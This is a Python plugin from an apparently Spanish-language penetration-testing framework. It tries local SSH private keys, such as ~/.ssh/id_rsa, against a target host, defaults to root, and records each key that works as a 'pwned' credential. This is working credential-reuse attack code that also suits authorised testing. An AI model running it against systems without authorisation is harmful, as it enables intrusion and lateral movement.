# scripts/ssh/attack/key_auth_test.py
import os
import paramiko
from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db

DEFAULT_KEY_PATHS = [
    "~/.ssh/id_rsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519", "~/.ssh/id_dsa",
]

class Script(BaseScript):
    name        = "key-auth-test"
    protocol    = "ssh"
    category    = "attack"
    description = "Prueba autenticación SSH con claves privadas locales o una clave específica."

    EXAMPLES = [
        {"flag": "--key-path", "desc": "Ruta a la clave privada",
         "good": "ssh --script=key-auth-test -t 10.10.10.5 -u root --key-path /tmp/id_rsa",
         "bad":  "ssh --script=key-auth-test -t 10.10.10.5 (sin -u ni --key-path)"},
    ]

    def run(self, **kwargs):
        port      = int(kwargs.get("port") or 22)
        timeout   = int(kwargs.get("timeout") or self.target.timeout or 5)
        username  = self.creds.user or "root"
        key_path  = kwargs.get("key_path")
        ip        = self.target.ip

        key_paths = ([os.path.expanduser(key_path)] if key_path
                     else [os.path.expanduser(p) for p in DEFAULT_KEY_PATHS])
        key_paths = [p for p in key_paths if os.path.isfile(p)]

        if not key_paths:
            console.print("[yellow]No se encontraron claves privadas para probar.[/yellow]")
            return None

        print_result("SSH", ip, "info",
                     f"key-auth-test: {len(key_paths)} clave(s) para '{username}'")

        valid = []
        for kp in key_paths:
            key = None
            for cls in (paramiko.RSAKey, paramiko.ECDSAKey,
                        paramiko.Ed25519Key, paramiko.DSSKey):
                try:
                    key = cls.from_private_key_file(kp); break
                except Exception:
                    continue

            if key is None:
                continue

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=username, pkey=key,
                               timeout=timeout, allow_agent=False, look_for_keys=False)
                client.close()
                print_result("SSH", ip, "pwned", f"clave válida: {kp} para '{username}'")
                session_db.save_credential(ip, username, kp, "key",
                                           valid=True, source="ssh_key_auth")
                valid.append(kp)
            except paramiko.AuthenticationException:
                print_result("SSH", ip, "fail", f"clave rechazada: {kp}")
            except Exception as e:
                print_result("SSH", ip, "fail", f"error con {kp}: {e}")

        return valid
